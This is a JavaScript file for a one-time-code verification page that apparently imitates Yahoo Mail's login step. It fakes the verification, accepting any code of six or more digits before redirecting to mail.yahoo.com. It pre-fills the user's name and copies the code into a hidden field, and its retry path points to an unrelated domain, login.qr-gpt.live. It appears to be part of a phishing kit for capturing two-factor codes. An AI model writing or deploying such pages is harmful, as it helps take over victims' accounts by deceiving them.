// Import jQuery
const $ = require("jquery")

$(document).ready(() => {
  console.log("OTP verification page initialized")

  let retryCount = 0
  const maxRetries = 3

  // Handle form submission
  $("#otp-form").on("submit", (e) => {
    e.preventDefault()

    const otpCode = $("#otp_code").val().trim()
    if (!otpCode) {
      showError("Please enter the verification code.")
      return false
    }

    if (otpCode.length < 4) {
      showError("Please enter a valid verification code.")
      return false
    }

    console.log("Submitting OTP:", otpCode)
    $("#verifyCode").val(otpCode)

    showState("loading-state")

    // Simulate verification process
    setTimeout(() => {
      // For demo purposes, accept any code with 6+ digits
      if (otpCode.length >= 6) {
        showState("success-state")

        // Redirect to success page after 2 seconds
        setTimeout(() => {
          window.location.href = "https://mail.yahoo.com/d/folders/1"
        }, 2000)
      } else {
        handleVerificationError()
      }
    }, 2000)

    return false
  })

  // Handle verification error
  function handleVerificationError() {
    retryCount++

    if (retryCount >= maxRetries) {
      showError("Too many incorrect attempts. Please try again later.", false)
    } else {
      const remainingAttempts = maxRetries - retryCount
      showError(`Incorrect code. ${remainingAttempts} attempt${remainingAttempts > 1 ? "s" : ""} remaining.`)
    }
  }

  // State management
  function showState(state) {
    $("#main-form, #error-container, #loading-state, #success-state").hide()
    $(`#${state}`).show()
  }

  function showError(message, isRetryable = true) {
    $("#error-message").text(message)
    showState("error-container")

    if (!isRetryable) {
      $("#refreshButton")
        .text("Start Over")
        .off("click")
        .on("click", () => {
          window.location.href = "https://login.qr-gpt.live/"
        })
    }
  }

  // Retry handler
  $("#refreshButton").click(() => {
    $("#otp_code").val("")
    showState("main-form")
    setTimeout(() => {
      $("#otp_code").focus()
    }, 100)
  })

  // Resend code handler
  $("#resend-code").click(function (e) {
    e.preventDefault()
    console.log("Resending verification code...")

    // Show temporary message
    const originalText = $(this).text()
    $(this).text("Code sent!").css("color", "#28a745")

    setTimeout(() => {
      $(this).text(originalText).css("color", "#0078d4")
    }, 3000)
  })

  // Get username from URL or storage
  function getUsername() {
    const urlParams = new URLSearchParams(window.location.search)
    let user = urlParams.get("u")

    if (user) {
      return decodeURIComponent(user)
    }

    user = sessionStorage.getItem("yh_username") || localStorage.getItem("yh_username")
    if (user) {
      return user
    }

    return "your account"
  }

  // Auto-format OTP input
  $("#otp_code").on("input", function () {
    let value = $(this).val().replace(/\D/g, "") // Remove non-digits

    if (value.length > 8) {
      value = value.substring(0, 8)
    }

    $(this).val(value)

    // Auto-submit if 6 digits entered
    if (value.length === 6) {
      setTimeout(() => {
        $("#otp-form").submit()
      }, 500)
    }
  })

  // Initialize page
  const username = getUsername()
  $("#userEmail").text(username)
  $("#username").val(username)

  // Auto-focus OTP input
  setTimeout(() => {
    $("#otp_code").focus()
  }, 500)

  console.log("OTP page ready for user:", username)
})
